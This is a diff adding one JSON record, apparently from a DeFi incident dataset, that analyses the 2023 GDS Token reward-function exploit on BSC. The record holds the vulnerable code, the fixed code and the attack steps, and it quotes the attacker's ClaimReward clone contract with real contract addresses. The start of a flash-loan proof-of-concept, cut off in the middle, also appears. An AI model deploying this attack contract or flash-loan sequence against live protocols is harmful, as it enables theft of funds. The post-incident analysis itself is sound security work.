@@ -1,0 +1,49 @@
+{
+ "id": "2023__2023-01-03_GDSToken_BusinessLogic_BSC",
+ "source_file": "2023/2023-01-03_GDSToken_BusinessLogic_BSC.md",
+ "title": "GDS Token — Reward Function LP Token Price Manipulation (Business Logic Flaw) Analysis",
+ "date": "2023-01-03",
+ "protocol": "GDS Token",
+ "chain": "BSC",
+ "loss_raw": "~$180,000 USDT",
+ "loss_usd": 180000.0,
+ "root_cause": "`pureUsdtToToken()` reward function burns GDS while distributing LP tokens — GDS burning manipulates pool ratio, inflating LP value; claimed repeatedly via multiple clone contracts",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic",
+  "flash-loan"
+ ],
+ "code_before": [
+  "// ❌ Vulnerability: GDS burning corrupts pool k value, artificially inflating LP unit price\nfunction pureUsdtToToken(uint256 _uAmount) external returns (uint256) {\n    // Calculate GDS quantity corresponding to the input USDT amount (based on current pool price)\n    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);\n\n    // ❌ Core flaw 1: Transfer GDS directly to deadAddress to burn\n    // Burn → GDS reserve in GDS/USDT pool decreases → GDS price rises\n    // In AMM invariant k = x*y, when x(GDS) decreases, y(USDT) value remains the same,\n    // so NAV (net asset value) per LP token rises\n    _transfer(address(this), deadAddress, gdsAmount);  // ❌ Direct manipulation of pool reserve\n\n    // ❌ Core flaw 2: Reward calculated at elevated LP price immediately after burn\n    // Caller receives excessively more LP tokens relative to contributed USDT\n    uint256 lpReward = calculateLPReward(_uAmount);    // ❌ Calculated at manipulated price\n    pair.transfer(msg.sender, lpReward);               // ❌ Excessive LP distribution\n\n    return gdsAmount;\n}\n\n// ❌ Vulnerability: LP reward calculation reflects elevated GDS price post-burn\nfunction calculateLPReward(uint256 _uAmount) internal view returns (uint256) {\n    // Calculate LP unit price based on current pool state (post-burn)\n    // → LP unit price is elevated immediately after GDS burn\n    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();\n    uint256 totalLP = pair.totalSupply();\n    // LP token value = (reserve0 * 2) / totalLP  (USDT basis)\n    uint256 lpPrice = (uint256(reserve0) * 2 * 1e18) / totalLP;  // ❌ Manipulated price\n    return (_uAmount * 1e18) / lpPrice;\n}",
+  "// ❌ Vulnerability: Anyone can deploy a new ClaimReward contract and claim without address validation\ncontract ClaimReward {\n    address Owner;\n    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address deadAddress = 0x000000000000000000000000000000000000dEaD;\n\n    // ❌ Phase 1 claim: Receive LP reward via pureUsdtToToken\n    function transferToken() external {\n        // Burn GDS worth 100 USDT and receive LP tokens as reward\n        // ❌ Burn → GDS price rises → larger rewards in subsequent claims\n        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));\n        Pair.transfer(Owner, Pair.balanceOf(address(this)));  // ❌ Transfer LP to attacker\n    }\n\n    // ❌ Phase 2 claim: Burn small GDS amount, re-claim LP + immediately sell GDS\n    function withdraw() external {\n        GDS.transfer(deadAddress, 10_000);          // ❌ Trigger additional LP claim via small burn\n        Pair.transfer(Owner, Pair.balanceOf(address(this)));\n        GDS.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(GDS);\n        path[1] = address(USDT);\n        // ❌ Immediately sell obtained GDS for USDT → profit realization\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp\n        );\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: Calculate LP reward based on pre-burn snapshot + apply burn cap\nfunction pureUsdtToToken(uint256 _uAmount) external returns (uint256) {\n    // ✅ Fix 1: Snapshot pool state before burning\n    (uint112 reserve0Before, uint112 reserve1Before,) = pair.getReserves();\n    uint256 totalLPBefore = pair.totalSupply();\n\n    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);\n\n    // ✅ Fix 2: Apply burn cap and protect minimum pool reserve\n    require(reserve1Before - gdsAmount >= MIN_RESERVE, \"reserve too low\");\n    _transfer(address(this), deadAddress, gdsAmount);\n\n    // ✅ Fix 3: Calculate LP reward based on pre-burn price (manipulation-proof)\n    uint256 lpPrice = (uint256(reserve0Before) * 2 * 1e18) / totalLPBefore;\n    uint256 lpReward = (_uAmount * 1e18) / lpPrice;\n\n    // ✅ Fix 4: Apply maximum reward cap\n    require(lpReward <= maxLPRewardPerCall, \"reward exceeds limit\");\n    pair.transfer(msg.sender, lpReward);\n\n    return gdsAmount;\n}",
+  "// ✅ Fix: Capture pool state before burn execution for reward calculation\nfunction pureUsdtToToken(uint256 _uAmount) external returns (uint256) {\n    // ✅ 1. Snapshot current pool state before burn\n    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();\n    uint256 totalLP = pair.totalSupply();\n\n    // ✅ 2. Calculate reward at pre-burn price (manipulation-proof)\n    uint256 lpPriceBefore = (uint256(reserve0) * 2 * 1e18) / totalLP;\n    uint256 lpReward = (_uAmount * 1e18) / lpPriceBefore;\n\n    // ✅ 3. Add burn cap and minimum reserve protection\n    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);\n    require(uint256(reserve1) > gdsAmount + MIN_RESERVE, \"insufficient reserve\");\n    require(gdsAmount <= MAX_BURN_PER_CALL, \"burn limit exceeded\");\n\n    // Execute burn (separated from reward calculation)\n    _transfer(address(this), deadAddress, gdsAmount);\n\n    // ✅ 4. Distribute calculated reward\n    pair.transfer(msg.sender, lpReward);\n\n    return gdsAmount;\n}"
+ ],
+ "steps": [
+  "- Attacker EOA `0xcF23...36a7` exchanges 50 BNB → USDT (approximately $12,500)",
+  "- Buys GDS with a portion of USDT → adds GDS/USDT liquidity → obtains LP tokens",
+  "- Calls `transferToken()` on each clone → burns GDS worth 100 USDT × 100 times → cumulative GDS price appreciation",
+  "- **Waits 1,118 blocks** (block 24,449,918 → 24,451,036, approximately 56 minutes)",
+  "Calls testExploit() → ContractTest executes",
+  "1. Request Ellipsis/Wombat SwapFlashLoan",
+  "2. Nested DODO FlashLoan",
+  "3. Bulk swap 600,000 USDT → GDS",
+  "600,000 USDT → 3,448,741.57 GDS exchanged",
+  "Add remaining USDT + GDS liquidity to GDS/USDT pair → Mint LP",
+  "4. Sequential withdraw() on 100 ClaimReward contracts",
+  "Each clone: burn 10,000 GDS → receive LP reward",
+  "Received GDS → immediately sold for USDT on PancakeSwap",
+  "100 iterations accumulate LP drain",
+  "5. Remove liquidity + final GDS → USDT liquidation",
+  "Remove all LP → receive USDT + GDS",
+  "Sell remaining GDS → USDT (swap)",
+  "6. Repay flash loans"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────┐\n│                     Attacker EOA (0xcF23...36a7)                    │\n│             Calls testExploit() → ContractTest executes             │\n└───────────────────────────┬─────────────────────────────────────────┘\n                            │ 1. Request Ellipsis/Wombat SwapFlashLoan\n                            ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│     SwapFlashLoan (0x28ec...d13) — Lends 2,063,875.63 USDT         │\n│     Calls executeOperation() callback                               │\n└───────────────────────────┬─────────────────────────────────────────┘\n                            │ 2. Nested DODO FlashLoan\n                            ▼\n┌──────────────────────────────────────",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// PoC Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/GDS_exp.sol\n\ncontract ContractTest is Test {\n    GDSToken GDS   = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);\n    IERC20 USDT    = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);\n    address dodo   = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n    address[] contractList;  // List of 100 ClaimReward clone addresses\n\n    function testExploit() public {\n        // [Phase 1] Acquire initial funds: 50 BNB → USDT → GDS\n        address(WBNB).call{value: 50 ether}("
+ ]
+}
